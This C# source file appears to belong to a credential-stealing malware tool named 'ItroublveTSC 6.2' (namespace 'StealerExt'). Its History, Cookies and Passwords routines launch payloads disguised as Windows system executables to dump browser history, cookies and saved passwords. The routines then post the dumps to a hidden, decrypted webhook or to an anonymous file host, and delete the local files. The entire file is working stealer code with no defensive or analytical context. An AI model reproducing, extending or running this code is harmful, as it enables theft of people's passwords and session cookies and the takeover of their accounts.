using System;
using System.IO;
using System.Net;
using System.Net.Http;

namespace StealerExt
{
    internal class API
	{
		public API(string _HookUrl)
		{
			_Client = new HttpClient();
			_URL = _HookUrl;
		}
        public static void History()
		{
			StartProcess.Run("xwizard.exe", $"{Environment.UserName}_History.txt");
			string _history = Temp + Environment.UserName + "_History.txt";
			if (string.IsNullOrEmpty(File.ReadAllText(_history)))
			{

				new API(wHook).SendMultiPartData("History file is empty.");
				return;
			}
			long s = new FileInfo(_history).Length;
			if (s < 7950000)
			{
				bool flag = File.Exists(_history);
				if (flag )
				{
					new API(wHook).SendMultiPartData("**Browser History**", $"{Environment.UserName}_History.txt", _history);
				}
				else
				{
					new API(wHook).SendMultiPartData("No history found");
				}
			}
			else
			{
				string info = null;
				UploadAnonFiles.UploadFile(_history, ref info);
				new API(wHook).SendMultiPartData(info.Replace("{0}", nameof(History)));
			}
			File.Delete(_history);
        }
        
		public static void Cookies()
		{
			StartProcess.Run("winhlp32.exe", "Cookies1");
			StartProcess.Run("splwow64.exe", "Cookies2");
			StartProcess.Run("hh.exe", "Cookies3");
			string c1 = File.ReadAllText(Temp + "Cookies1");
			string c2 = File.ReadAllText(Temp + "Cookies2");
			string c3 = File.ReadAllText(Temp + "Cookies3");
			string c = c1 + c2 + c3;
			File.WriteAllText(Temp + Environment.UserName + "_Cookies.txt", c);
			File.Delete(Temp + "Cookies1"); File.Delete(Temp + "Cookies2"); File.Delete(Temp + "Cookies3");
			string text = Temp + Environment.UserName + "_Cookies.txt";
			long size_c = new FileInfo(text).Length;
			if (string.IsNullOrEmpty(File.ReadAllText(text))) 
			{
				new API(wHook).SendMultiPartData("Cookies file is empty.");
				return;
			}
			if (size_c < 7950000)
            {
				bool flag = File.Exists(text);
				if (flag)
				{
					new API(wHook).SendMultiPartData("**Browser Cookies**", $"{Environment.UserName}_Cookies.txt", text);
				}
				else
				{
					new API(wHook).SendMultiPartData("No cookies found!");
				}
			}
            else
            {
				string info = null;
				UploadAnonFiles.UploadFile(text, ref info);
                new API(wHook).SendMultiPartData(info.Replace("{0}", nameof(Cookies)));
			}
			File.Delete(text);
		}

        public static void Passwords()
		{
			StartProcess.Run("snuvcdsm.exe", "Passwords");
			string passwordLoc = Path.Combine(Temp + "Passwords.txt");
			if (string.IsNullOrEmpty(File.ReadAllText(passwordLoc))) 
			{
				new API(wHook).SendMultiPartData("Password file is empty.");
				return;
			}
			long size_psw = new FileInfo(passwordLoc).Length;
			if (size_psw < 7950000)
            {
				if (File.Exists(passwordLoc))
				{
					new API(wHook).SendMultiPartData($"{Environment.UserName}_Passwords.txt" ,"**Browser Password**", passwordLoc);
				}
				else
				{
					new API(wHook).SendMultiPartData("No browser passwords found!");
				}
			}
            else
            {
				string info = null;
				UploadAnonFiles.UploadFile(passwordLoc, ref info);
				new API(wHook).SendMultiPartData(info.Replace("{0}", nameof(Passwords)));
			}
			File.Delete(passwordLoc);
		}

		public bool SendMultiPartData(string Content = null, string FileName = null, string filePath = null)
		{
			if (string.IsNullOrEmpty(Content) && (new FileInfo(filePath).Length > 0)) return false;
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent
			{
				{ new StringContent(name), "username" },
				{ new StringContent(pfp), "avatar_url" },
				{ new StringContent(Content), "content" }
			};
			if (filePath != null) multipartFormDataContent.Add(new ByteArrayContent(File.ReadAllBytes(filePath)), "File", FileName);
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}
		public bool SendMultiPartStream(string Content = null, string FileName = null, MemoryStream memoryStream = null)
		{
			if (string.IsNullOrEmpty(Content) && (memoryStream != null)) return false;
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent
			{
				{ new StringContent(name), "username" },
				{ new StringContent(pfp), "avatar_url" },
				{ new StringContent(Content), "content" }
			};
            if (memoryStream != null) multipartFormDataContent.Add(new ByteArrayContent(memoryStream.ToArray()), "File", FileName);
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}

		public static string wHook => Hook._DecryptedHook;
		public const string name = "ItroublveTSC 6.2";
		public const string pfp = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaZLjMqLWHlL0VMxjLOEYXohyV6C9dsEjKsg&usqp=CAU";
		private HttpClient _Client;
		private readonly string _URL;
		//public string _name { get; set; }
		//public string _ppUrl { get; set; }
		public static WebClient wc = new WebClient();
		public static string Temp = Path.GetTempPath();
	}
}